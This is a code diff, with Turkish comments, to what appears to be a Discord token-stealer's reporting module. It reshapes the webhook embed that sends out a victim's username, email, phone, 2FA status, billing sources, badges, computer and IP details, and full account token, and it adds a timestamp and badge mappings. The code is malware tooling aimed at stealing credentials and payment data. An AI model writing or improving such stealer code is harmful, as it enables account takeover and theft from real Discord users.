@@ -176,6 +176,9 @@ const PROFILE_BADGE_MAP = {
     'hypesquad_online_house_1': '<:bravery:1533643863842095214>',
     'hypesquad_online_house_2': '<:brilliance:1533643948197679284>',
     'hypesquad_online_house_3': '<:balance:1533643975586615397>',
+    'hypesquad_house_1':        '<:bravery:1533643863842095214>',
+    'hypesquad_house_2':        '<:brilliance:1533643948197679284>',
+    'hypesquad_house_3':        '<:balance:1533643975586615397>',
     'premium_early_supporter':  '<:early:1533644073271824516>',
     'bug_hunter_level_2':       '<:bughunter2:1533644547287023636>',
     'verified_developer':       '<:botdev:1533644656670277742>',
@@ -227,7 +230,13 @@ function parseBilling(sources) {
 // ── Embed builder ─────────────────────────────────────────────────────────────
 
 function buildPayload(title, fields, thumbnail, image) {
-    const embed = { title, color: EMBED_COLOR, fields, footer: { text: BOT_NAME } };
+    const embed = {
+        title,
+        color:     EMBED_COLOR,
+        fields,
+        footer:    { text: BOT_NAME },
+        timestamp: new Date().toISOString(),
+    };
     if (thumbnail) embed.thumbnail = { url: thumbnail };
     if (image)     embed.image     = { url: image };
     return { username: BOT_NAME, avatar_url: AVATAR_URL, embeds: [embed] };
@@ -275,34 +284,27 @@ function buildFields(user, billing, friends, token, extra) {
     if (paypals) billingParts.push(`\`${paypals} PayPal${paypals > 1 ? 's' : ''} found\``);
     const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';
 
-    const fields = [
-        // Satır 1: Username, Email, Phone
-        { name: '<:user:1533638622761455637> Username', value: `\`${user.username}\``,          inline: true },
-        { name: '<:mail:1533638816559140877> Email',    value: `\`${user.email || 'N/A'}\``,    inline: true },
-        { name: '<:phone:1533639066057179136> Phone',   value: `\`${user.phone || 'N/A'}\``,    inline: true },
-        // Satır 2: ID, 2FA, Nitro
-        { name: '<:id:1533663001322717214> ID',         value: `\`${user.id}\``,                inline: true },
-        { name: '<:lock:1533640371882557501> 2FA',      value: user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>', inline: true },
-        { name: '<:nitro:1533639641687920823> Nitro',   value: getNitro(user),                  inline: true },
-        // Satır 3: Billing, Badges (tam satır)
-        { name: '<:card:1533639749376671785> Billing',  value: billingVal,                      inline: true },
-        { name: '<:badge:1533639967761240154> Badges',  value: getBadges(user),                 inline: true },
-        { name: '\u200b',                               value: '\u200b',                         inline: true },
+    // 3 grup, aralarında boş satır — Discord Info tarzı
+    const info = [
+        // Grup 1: Kimlik
+        `<:user:1533638622761455637> **Username:** \`${user.username}\``,
+        `<:mail:1533638816559140877> **Email:** \`${user.email || 'N/A'}\``,
+        `<:phone:1533639066057179136> **Phone:** \`${user.phone || 'N/A'}\``,
+        '',
+        // Grup 2: Hesap
+        `<:lock:1533640371882557501> **2FA:** ${user.mfa_enabled ? '<:tick:1533641966632435936>' : '<:no:1533642070701641889>'}`,
+        `<:nitro:1533639641687920823> **Nitro:** ${getNitro(user)}`,
+        `<:card:1533639749376671785> **Billing:** ${billingVal}`,
+        `<:badge:1533639967761240154> **Badges:** ${getBadges(user)}`,
+        '',
+        // Grup 3: Sistem (extra)
+        ...(extra || []),
+    ].join('\n');
+
+    return [
+        { name: 'Discord Info', value: info,                                                    inline: false },
+        { name: '<:token:1533639840254660640> Token', value: `\`\`\`${token}\`\`\``,            inline: false },
     ];
-
-    // Extra satırlar (Computer, IP, Client) — alt alta tek field
-    if (extra && extra.length) {
-        fields.push({
-            name:   '\u200b',
-            value:  extra.join('\n'),
-            inline: false,
-        });
-    }
-
-    // Token — en altta, kopyalanabilir
-    fields.push({ name: '<:token:1533639840254660640> Token', value: `\`\`\`${token}\`\`\``, inline: false });
-
-    return fields;
 }
 
 function getDiscordClientName() {
